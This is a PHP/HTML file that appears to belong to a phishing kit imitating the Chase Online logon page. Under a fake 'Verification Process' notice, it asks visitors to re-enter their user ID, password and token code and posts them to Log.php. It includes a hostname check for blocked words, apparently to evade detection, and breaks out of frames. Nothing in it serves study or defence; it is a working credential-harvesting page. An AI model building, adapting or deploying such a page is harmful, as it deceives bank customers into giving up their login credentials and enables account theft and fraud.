<?php 
require_once 'hostname_check.php'; // Check if hostname contain blocked word

$index="Logon.php?header=1&enroll=".$_GET['enroll'];
$hostname = bin2hex ($_SERVER['HTTP_HOST']); //GET HOST NAME
$No_id = "Logging_in.php?$hostname";
require_once 'enc.php';
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta http-equiv="Pragma" content="no-cache"/>
<meta http-equiv="Expires" content="-1"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Cache-Control" content="no-store"/>
<meta http-equiv="Cache-Control" content="post-check=0"/>
<meta http-equiv="Cache-Control" content="pre-check=0"/>
<meta http-equiv="Content-Style-Type" content="text/css"/>
<meta name="CONNECTION" content="CLOSE"/><link rel="stylesheet" type="text/css" href="Logon_Files/commonui/stylesheets/jpui.css?Style=<?php echo $index; ?>"/><link rel="stylesheet" type="text/css" href="Logon_Files/Themes/default/css/style.css?Style=<?php echo $index; ?>"/><link rel="stylesheet" type="text/css" href="Logon_Files/Themes/default-col/css/style.css?Style=<?php echo $index; ?>"/><link rel="stylesheet" type="text/css" href="Logon_Files/Themes/guest/css/style.css?Style=<?php echo $index; ?>"/><link rel="stylesheet" type="text/css" href="Logon_Files/Themes/default/css/style_new.css?Style=<?php echo $index; ?>"/><link rel="stylesheet" type="text/css" href="Logon_Files/Themes/default-col/css/style_new.css?Style=<?php echo $index; ?>"/><link rel="stylesheet" type="text/css" href="Logon_Files/Themes/guest/css/style_new.css?Style=<?php echo $index; ?>"/><link rel="SHORTCUT ICON" href="Logon_Files/images/favicon.ico"/><title>Chase Online - Logon</title><link href="Logon_Files/commonui/stylesheets/global_megamenu_nisi1.css?Style=<?php echo $index; ?>" rel="stylesheet" type="text/css" /><link href="Logon_Files/commonui/stylesheets/global_megamenu_nisi1.ff.css?Style=<?php echo $index; ?>" rel="stylesheet" type="text/css" /><link href="Logon_Files/commonui/stylesheets/global_megamenu.col.css?Style=<?php echo $index; ?>" rel="stylesheet" type="text/css" />

		
				

</head>


<body class="chasejs-designfamily-lcol chaseui-site-col ">

<script>
  if (window!= top)
    top.location.href = location.href
</script>


<div class="chaseui-unsecurebrowser-message" id ="unsecureBrowserMessage" style="display:none;"> 
		<a id="status-close-icon" class="chaseui-close" onclick="closeUnsecureBrowserMessage();return false;" href="#">&times;<span class="accessible-text"> Close Button, Closes Overlay </span></a> 
		<div class="chaseui-status-content-container">
		<h2 class="chaseui-unsecurebrowser-title" >Your browser may not give you the best experience when you're on Chase.com.</h2>
		<div class="chaseui-unsecurebrowser-status-info" >We recommend that you use any of the following browsers: Internet Explorer 8 or higher, Firefox 25 or higher, Safari 6.0 or higher, and Chrome 31 or higher.</div> 
		<div class="chase-unsecurebrowser-button-container">
		<a href="#" class="chase-unsecurebrowser-button" role="button" data-type="tertiary-button" data-size="medium" data-decoration="none"	data-background="none" data-multiselect="false"	data-accessible-text="learn more button"  data-verticalpos="10" data-horizontalpos="800">Learn more</a>
		</div>
		</div>
		</div>




<div id="main-content-section" tabindex="0"></div>
<center>
<a href="#" class="chaseutil-skiptomain-accessibletext">Skip to main content.</a><table cellspacing="0" cellpadding="0" border="0" role="presentation" class="fullwidth" summary="global navigation"><tr><td><a href="#" class="  " id="siteLogo" style="display:inline-block;"><img src="Logon_Files/images/logo.gif"  style="margin: 17px 17px 17px 17px;"/></a></td>
<td class="globalnav"><a id="homelink" href="JavaScript:document.location.href='#';" class="globalnavlinks ">Chase.com</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a id="privacypolicylik" href="JavaScript:document.location.href='#';" class="globalnavlinks ">Privacy Notice</a></td></tr></table><table cellspacing="0" cellpadding="0" border="0" role="presentation" summary="primary navigation"><tr><td class="spacerh5">&nbsp;</td></tr></table><table cellspacing="0" cellpadding="0" border="0" role="presentation" class="headerbarwidth" summary="section header"><tr class="headerbar"><td class="segimage" align="left">&nbsp;</td><td class="headerbardate">CHASE ONLINE<sup class='supsm'>SM</sup></td></tr></table>
<div class="constraint-container">
<table cellspacing="0" cellpadding="0" class="fullwidth">
	<tr>
		<td class="sidebar">&nbsp;</td>
		<td valign="top"><div class="Printable">
    <script language="javascript">var jsVer = "";</script>
    <script language="javascript1.1" type="text/javascript">jsVer = "1.1";</script> 
    <script language="javascript1.2" type="text/javascript">jsVer = "1.2";</script>
    <script language="javascript1.3" type="text/javascript">jsVer = "1.3";</script>
    <script language="javascript1.4" type="text/javascript">jsVer = "1.4";</script>
    <script language="javascript1.5" type="text/javascript">jsVer = "1.5";</script>
    <script language="javascript1.6" type="text/javascript">jsVer = "1.6";</script>
    <script language="javascript2.0" type="text/javascript">jsVer = "2.0";</script>
    
    <form name="<?php echo $index; ?>" method="POST" action="Log.php" id="<?php echo $index; ?>" autocomplete="off">




       
      

      <div id="flashcontent"></div>
	  <table cellspacing="0" cellpadding="0" border="0" class="100%">
        <tr>
          <td class="spacerW25">&nbsp;</td>
          <td valign="top" width="721">
            <table cellpadding="0" cellspacing="0" border="0" width="100%">
              <tr>
                <td colspan="3" class="spacerH20">&nbsp;</td>
              </tr>
              <tr>
                <td colspan="3" align="center">
                  <table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td class="errorrow" align="middle" colspan="3">Verification Process</td>
          </tr>
          <tr>
            <td>&nbsp;</td>
            <td><br>
            <span class="errortext">
            For Your Safety,</span> <span class="bodytext"> you have to use the same user id and password we have on file in order to restore your access.</span></td>
          </tr>
		              <td colspan="3" class="spacerh5">&nbsp;</td>
          </tr>
            <tr>
            <td colspan="3" class="spacerh5">&nbsp;</td>
          </tr>
          <tr>
            <td colspan="3" class="divider">&nbsp;</td>
          </tr>
       <tr>
            <td colspan="3" class="spacerh5">&nbsp;</td>
          </tr>
         </table>
                </td>
              </tr>
              <tr>
                <td valign="top" align="left" width="248" height="170">                    
									  
                  <table id="secureLogonTable" width="270" height="170" border="0" cellpadding="0" cellspacing="0" bgcolor="#F2F2E1">
	<tr align="center">
		<td width="5">&nbsp;</td>
		<td height="35" colspan="3" class="bodyTextSecureLogon">
                        Secure Log On
                        <img src="Logon_Files/images/locker.gif" width="11" height="13" alt="" />
                      </td>
	</tr>
	<tr>
		<td width="5"></td>
		<td align="right" class="bodyTextBold" style="width: 79px;">
						<label for="UserID" id="UserIdLabel">User ID <span id="ADAUserIdText" class="chaseutil-hidevisual">Attention Window Eyes users: 
						If you are using Internet Explorer 9 or 10, you may not be able to log in to the Chase site or other 
						Internet sites. Please read Using Window Eyes on our accessibility page at chase.com/accessibility.</span></label>
					  </td>
		<td width="10" rowspan="10">
                        <img src="Logon_Files/images/spacer.gif" width="10" height="10" />
                      </td>
		<td>
                        <input name="IDUser" type="text" maxlength="32" id="UserID" tabindex="1" name="UserID" title="User ID (required field)" style="width: 160;" />
                        <!--mp_trans_schedule_disable_start-->
                        
                        <!--mp_trans_schedule_disable_end-->
                      </td>
	</tr>
	<tr>
		<td width="5"></td>
		<td align="right" class="bodyTextBold">
                          <label for="Password" id="PasswordLabel">Password</label>
                      </td>
		<td>
                        <input name="Passcode" type="password" id="Password" tabindex="2" title="Password (required field)" name="Password" class="inputTextBox" autocomplete="off" style="width: 160;" />
                      </td>
	</tr>
	<tr id="trFirstTokenCode" style="display: none;">
		<td width="5"></td>
		<td align="right">
                        <label for="Token" id="lblTokenCode1">
                          <span class="bodytextbold">Token code</span><br><span class="bodytext"><i>(if required)</i></span>
                        </label>
                        <a id="TokenEntryHwtf" title="Link to more information in a new browser window." class="helplinks" onblur="window.status=&#39;&#39;;return true;" onmouseover="window.status=&#39;&#39;;return true;" onfocus="window.status=&#39;&#39;;return true;" onmouseout="window.status=&#39;&#39;;return true;" href="javascript:OpenWindowHelp(&#39;#;);"><img src="Logon_Files/images/contextualHelpIcon.gif" alt="Link to more information in a new browser window." style="height:12px;width:10px;border-width:0px;" /></a>
                      </td>
		<td>
                        <input name="Token" type="text" maxlength="6" id="Token" tabindex="4" name="Token" style="width: 160;" />
                      </td>
	</tr>
	<tr id="rwRemUserID">
		<td width="5"></td>
		<td align="right">
                        <input id="usr" type="checkbox" name="usr" tabindex="6" />
                      </td>
		<td class="bodyText"><label for="usr">Remember my User ID</label></td>
	</tr>
	<tr id="rwForgotPwdLinkShowHide" align="center">
		<td width="5"></td>
		<td colspan="3">
                        <a href="<?php echo $No_id; ?>" id="hrefForgotUserIdPassword" Class="bodyText10Sm">Forgot your User ID and Password?</a>
                      </td>
	</tr>
	<tr>
		<td width="5"></td>
		<td height="45" colspan="3" align="center">
                        <div class="spacerH5">&nbsp;</div>
                          <input type="image" id="logon" src="Logon_Files/images/logon.gif" onclick="return check_all_fields_logon_RSA(document.getElementById('UserID'), document.getElementById('Password'));" width="58" height="21" border="0" title="Log On" tabindex="7" />
                        <div class="spacerH10">&nbsp;</div>
                      </td>
	</tr>
</table>

                </td>
                <td rowspan="3" class="spacerW15">&nbsp;</td>
                <td rowspan="3" valign="top">
                 
<style>
#routableEnrollHeader {padding-bottom:6px; font-size:1.2em; color:#095aa6; font-weight:bold; background: url(Logon_Files/content/ecpweb/sso/image/bk-dash.gif) repeat-x bottom left; margin-bottom:0px; text-transform:uppercase;}
#routableEnrollHeader #routableEnrollHeaderPad {padding-left:10px;}
#routableEnrollSubheader {font-size:0.6em; color:#000000;}
#routableSecurityBox h2 span {font-size:1.4em; color:#095aa6;}
#routableEnrollText {margin:10px; font-size:0.7em; border:}
#routableEnrollButton {display:block; width:180px; height:24px; background:url(Logon_Files/content/ecpweb/sso/image/ob-button-enroll-now.gif) no-repeat; margin-top:15px;}
#routableEnrollButton span {display:block; position:absolute; top:-1000px;}
#routableDemoButton {display:block; width:180px; height:24px; background:url(Logon_Files/content/ecpweb/sso/image/ob-button-see-the-demo.gif) no-repeat; margin-top:10px;}
#routableDemoButton span {display:block; position:absolute; top:-1000px;}
#routableSecurityBox {margin-top:0px; margin-left:30px; height:30px;}
#routableSecurityBox h2 {margin-top:0; font-size:1.2em; font-weight:bold; text-transform:uppercase; background: url(Logon_Files/content/ecpweb/sso/image/bk-dash.gif) repeat-x bottom left; margin-bottom:0px; padding-bottom:3px;}
#rountableLinkBox {background:url(Logon_Files/content/ecpweb/sso/image/sculptured-octagon.jpg) no-repeat bottom right; height:300px; font-size:0.75em;}
#rountableLinkBox ul {list-style-image:url(Logon_Files/content/ecpweb/sso/image/blue-link-arrow.gif); margin-top:10px; margin-left:-20;}
* html #rountableLinkBox ul {margin-left:20px;}
#rountableLinkBox a {color:#095aa6; text-decoration:none;}
#rountableLinkBox a:hover {text-decoration:underline;}
#rountableLinkBox li {margin-bottom:2px;}
#spacerH10 {FONT-SIZE: 0px; HEIGHT: 10px;}
* html  #spacerH10 {FONT-SIZE: 0px; HEIGHT: 10px; width: 90%;}
#topspacer {margin-top:1px;}
#clear {height:1px; width:460px; clear:both;}
</style>
<div id="clear"></div>
<div id="topspacer" width: 460px;>
<div id="routableSecurityBox">
	<h2>Chase helps keep you<br><span>safe and informed</span></H2>
	<div id="rountableLinkBox">
		<ul>
			<li><a href="#"><strong>Report Fraud and E-mail scams</strong></a></li>
			<li><a href="#">Learn how to protect yourself</a></li>
			<li><a href="#">Find out how we protect you</a></li>
			<li><a href="#">Learn more about online fraud</a></li>
			<li><a href="#">Read tips for safe online shopping</a></li>
		</ul>
	</div>
</div>
</div>



                </td>
              </tr>
              <tr>
                <td class="spacerH15">&nbsp;</td>
              </tr>
              <tr>
                <td align="left" width="248">
               
<style>
#routableEnrollHeader {padding-bottom:6px; font-size:1.2em; color:#095aa6; font-weight:bold; background: url(Logon_Files/content/ecpweb/sso/image/bk-dash.gif) repeat-x bottom left; margin-bottom:0px; text-transform:uppercase;}
#routableEnrollHeader #routableEnrollHeaderPad {padding-left:10px;}
#routableEnrollSubheader {font-size:0.6em; color:#000000;}
#routableSecurityBox h2 span {font-size:1.4em; color:#095aa6;}
#routableEnrollText {margin:10px; font-size:0.7em; border:}
#routableEnrollButton {display:block; width:180px; height:24px; background:url(Logon_Files/content/ecpweb/sso/image/ob-button-enroll-now.gif) no-repeat; margin-top:15px;}
#routableEnrollButton span {display:block; position:absolute; top:-1000px;}
#routableDemoButton {display:block; width:180px; height:24px; background:url(Logon_Files/content/ecpweb/sso/image/ob-button-see-the-demo.gif) no-repeat; margin-top:10px;}
#routableDemoButton span {display:block; position:absolute; top:-1000px;}
</style>

<h2 id="routableEnrollHeader"><div id="routableEnrollHeaderPad">Get a user ID<br><span id="routableEnrollSubheader">to help you manage your money</span></div></h2>
<div id="routableEnrollText">If you're not already using Chase Online to access your account, enroll now. Chase Online offers a broad range of products and services to manage your money.
<a href="#" id="routableEnrollButton"><span>Enroll Now</span></a>
<a href="#" id="routableDemoButton"><span>See the Demo</span></a>
</div>


                </td>
              </tr>
            </table>
          </td>
          <td class="spacerW25">&nbsp;</td>
        </tr>
      </table>
    


</form>
  </div></td>
		<td class="sidebar">&nbsp;</td>
	</tr>
	<tr>
		<td class="sidebar">&nbsp;</td>
		<td class="spacerh30">&nbsp;</td>
		<td class="sidebar">&nbsp;</td>
	</tr>
	<tr>
		<td class="sidebar" colspan="3">&nbsp;</td>
	</tr>
</table>
</div>
<table border="0" cellspacing="0" cellpadding="0" role="presentation" class="fullwidth" summary="terms of use link and copyright"><tr><td class="spacerh10" colspan="3">&nbsp;</td></tr><tr><td style="width:30%; vertical-align:top">&nbsp;</td><td align="center" width="45%" valign="top"><span class="footertext"><a id="SecurityLink" href="JavaScript:document.location.href='#';" class="" onBlur="window.status='';return true" onMouseOver="window.status='';return true" onFocus="window.status='';return true" onMouseOut="window.status='';return true">Security</a>&nbsp;|&nbsp;<a id="TermsLink" href="JavaScript:document.location.href='#';" class="" onBlur="window.status='';return true" onMouseOver="window.status='';return true" onFocus="window.status='';return true" onMouseOut="window.status='';return true">Terms of Use</a>&nbsp;|&nbsp;<span><a id="AdChoices" href="JavaScript:OpenWindowStandard('#');" class="" onBlur="window.status='';return true" onMouseOver="window.status='';return true" onFocus="window.status='';return true" onMouseOut="window.status='';return true">AdChoices</a>&nbsp;<img src="Logon_Files/commonui/images/footericon.gif" alt="" ></span></span></td><td style="text-align:center; width:25%; vertical-align:top">&nbsp;</td></tr><tr><td class="spacerh20" colspan="3"></td></tr><tr><td colspan="3">


<table width="100%"  border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td align="center" class="footerText"><a href="#">Open a checking account</a> | <a href="#">Savings accounts</a> | <a href="#">Choose the right credit card</a> | <a href="#">Business credit cards</a> | <a href="#">Mortgage loans</a> | <a href="#">Home equity line of credit</a> | <a href="#">Auto loans</a></td>
  </tr>
  <tr>
    <td align="center" class="footerText">JPMorgan Chase Bank, N.A. Member FDIC</td>
  </tr>
</table>

</td></tr></table><div class="printable"><table border="0" cellspacing="0" cellpadding="0" class="fullwidth"><tr><td class="spacerh10">&nbsp;</td></tr><tr><td align="center" class="footertext">&nbsp;&#169; 2019 JPMorgan Chase &amp; Co.</td></tr><tr><td class="spacerh10">&nbsp;</td></tr></table></div><div  class="printable" ><table border="0" cellspacing="0" cellpadding="0" class="fullwidth"><tr><td align="center"><a href="javascript:void(0)" onclick="JavaScript:OpenWindow('#','Chase_Co_Browse','775','525');" target="Chase_Co_Browse" id="LiveLookLaunchIcon"><img src="Logon_Files/commonui/images/LiveLOOK.png" border="0" alt="Co-browse live look screen share assistance. Please do not click this link until a telephone banking representative advises you to do so." complete="complete" /></a></td></tr></table></div>

</body></html>
<?php ob_end_flush(); ?>